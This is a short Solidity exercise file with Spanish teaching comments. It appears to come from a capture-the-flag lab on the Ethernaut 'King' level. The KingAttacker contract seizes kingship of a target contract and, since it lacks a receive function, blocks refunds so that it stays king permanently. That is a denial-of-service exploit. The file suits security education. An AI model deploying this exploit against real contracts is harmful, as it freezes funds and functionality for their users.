// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract KingAttacker is Ownable {

    using Address for address payable;

    function attack(address payable kingContractAddress) external payable onlyOwner {
        kingContractAddress.sendValue(msg.value);

        // COMPLETAR
        // ¿Qué función del contrato King tenemos que llamar? Si mando eth desde el contrato me quedo 
        // sin gas y la transacción se revierte. Por eso se usa la librería 'Address' de openzeppelin.
        // ¿Hay que enviar ETH? ¿Cuánto?
        // ¿Qué función conviene usar en este caso para enviar ETH? ¿Qué librería usamos?
    }

    //receive() external payable {} Al no tener esta función el contrato de King no me puede devolver mis ether
    // cuando alguien quiera convertirse en rey y toda la transacción falla. El rey del contrato King va a ser
    // este contrato indefinidamente.
}
